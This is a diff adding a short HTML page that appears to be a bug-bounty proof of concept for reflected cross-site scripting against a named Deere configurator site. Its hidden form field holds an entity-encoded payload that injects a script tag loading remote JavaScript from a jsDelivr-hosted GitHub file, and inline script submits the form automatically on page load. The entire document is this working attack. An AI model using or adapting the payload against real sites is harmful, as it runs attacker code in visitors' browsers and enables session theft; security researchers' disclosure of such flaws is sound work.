@@ -1,0 +1,12 @@
+<html>
+  <body>
+    <form action="https://configurator.deere.com/index.html" method="POST">
+      <input type="hidden" name="error" value="xssReflected&quot;&gt;Hackerone&quot;&gt;&lt;script&#32;src&#61;&quot;https&#58;&#47;&#47;cdn&#46;jsdelivr&#46;net&#47;gh&#47;powlzbdzdz11&#47;obs&#47;bombe&#46;js&quot;&gt;&lt;&#47;script&gt;" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
